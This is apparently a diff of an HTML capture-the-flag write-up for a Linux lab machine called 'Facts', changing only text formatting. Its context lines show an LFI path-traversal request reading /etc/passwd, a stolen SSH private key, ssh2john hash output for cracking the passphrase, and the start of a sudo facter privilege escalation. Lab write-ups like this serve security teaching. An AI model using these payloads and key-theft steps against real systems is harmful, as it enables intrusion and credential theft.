@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Facts is a Medium difficulty Linux machine hosting a web application with an exposed admin registration endpoint and a <strong>Local File Inclusion (LFI)</strong> vulnerability in the admin panel's file download feature. The LFI is used to exfiltrate the user flag, SSH keys, and ultimately gain a shell. Privilege escalation is achieved by abusing a <code>sudo</code> misconfiguration with <code>facter</code>, a system profiling tool listed on GTFOBins.</p>
+      <p>Facts is a Medium difficulty Linux machine hosting a web application with an exposed admin registration endpoint and a <code>Local File Inclusion (LFI)</code> vulnerability in the admin panel's file download feature. The LFI is used to exfiltrate the user flag, SSH keys, and ultimately gain a shell. Privilege escalation is achieved by abusing a <code>sudo</code> misconfiguration with <code>facter</code>, a system profiling tool listed on GTFOBins.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full TCP port scan to discover all open services.</p>
@@ -142,7 +142,7 @@ robots                  [Status: 200, Size: 33, Words: 2, Lines: 1, Duration: 19
       <p>I register a new admin account and use it to log into the admin panel.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20260201185523.png" alt="Admin panel after successful registration" loading="lazy" /><span class="img-caption">Admin panel after successful registration</span></div>
       <h3 class="writeup-sub-title">Local File Inclusion (LFI)</h3>
-      <p>Inside the admin panel, I discover a file download feature at <code>/admin/media/download_private_file</code>. Testing this endpoint with a <strong>path traversal</strong> payload reveals it is vulnerable to <strong>Local File Inclusion (LFI)</strong>. By injecting <code>../../../../../../etc/passwd</code> as the <code>file</code> parameter, I can read arbitrary files from the server.</p>
+      <p>Inside the admin panel, I discover a file download feature at <code>/admin/media/download_private_file</code>. Testing this endpoint with a <code>path traversal</code> payload reveals it is vulnerable to <code>Local File Inclusion (LFI)</code>. By injecting <code>../../../../../../etc/passwd</code> as the <code>file</code> parameter, I can read arbitrary files from the server.</p>
       <h4 class="writeup-step-title">LFI Request — Reading /etc/passwd</h4>
       <div class="code-block"><pre><code>GET /admin/media/download_private_file?file=../../../../../../etc/passwd HTTP/1.1
 Host: facts.htb
@@ -202,7 +202,7 @@ Oz1vtwIuKXA6rZGjN0BjbvUx0ogTitZQjaTiDbY3qNdLnMgnvPjIFPkW6r0wVYPXjZuo77
 3f2m64XKJetZvbMRUoihFOxpHzsgn1iZyQuGg=
 -----END OPENSSH PRIVATE KEY-----</code></pre></div>
       <h3 class="writeup-sub-title">Cracking the SSH Key Passphrase</h3>
-      <p>The SSH key is passphrase-protected, so I cannot use it directly. I first convert it to a crackable format using <code>ssh2john</code>, then crack the passphrase using <strong>John the Ripper</strong>.</p>
+      <p>The SSH key is passphrase-protected, so I cannot use it directly. I first convert it to a crackable format using <code>ssh2john</code>, then crack the passphrase using <code>John the Ripper</code>.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Facts]
 └─$ sudo ssh2john id_ed25519
 id_ed25519:$sshng$6$16$e6e814e087072434ce40fb1559505a02$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010e6e814e087072434ce40fb1559505a020000001800000001000000330000000b7373682d65643235353139000000203f92fae4cb19ee062c5aa685b4ed1f4706e727b51fdeb93985105f2417787207000000a0b1b6725e67e14bcd71a38dd962337befecbf77ccdb2816decaa95d8c60d451e797ca27e444491ccc611c59db718605c9c46c1443cc08b7ace4d051a8c7f3804a057d7108373120b6aff6f35dff26b34d3b3d6fb7022e29703aad91a33740636ef531d288138ad6508da4e20db637a8d74b9cc827bcf8c814f916eabd305583d78d9ba8efbddfda6eb85ca25eb59bdb3115288a114ec691f3b209f5899c90b868$24$130</code></pre></div>
@@ -245,7 +245,7 @@ Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
 
 trivia@facts:~$</code></pre></div>
       <h2 class="writeup-section-title">Privilege Escalation: facter via GTFOBins</h2>
-      <p>Once on the machine, I run <code>sudo -l</code> to check for escalation vectors. The output shows that trivia can run <code>facter</code> as root without a password. <strong>Facter</strong> is a system profiling tool used by Puppet — and it is listed on <strong>GTFOBins</strong> as abusable for privilege escalation.</p>
+      <p>Once on the machine, I run <code>sudo -l</code> to check for escalation vectors. The output shows that trivia can run <code>facter</code> as root without a password. <code>Facter</code> is a system profiling tool used by Puppet — and it is listed on <code>GTFOBins</code> as abusable for privilege escalation.</p>
       <div class="code-block"><pre><code>trivia@facts:~$ sudo -l
 Matching Defaults entries for trivia on facts:
     env_reset, mail_badpass,
